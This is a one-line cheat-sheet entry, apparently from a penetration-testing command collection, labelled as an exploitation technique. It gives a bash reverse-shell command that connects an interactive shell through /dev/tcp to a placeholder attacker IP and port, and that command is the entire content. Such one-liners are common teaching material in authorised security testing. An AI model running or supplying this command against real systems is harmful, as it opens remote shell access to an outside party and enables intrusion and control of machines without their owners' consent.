# [Exploitation] Reverse shell (TCP via /dev/tcp) --bash
bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'
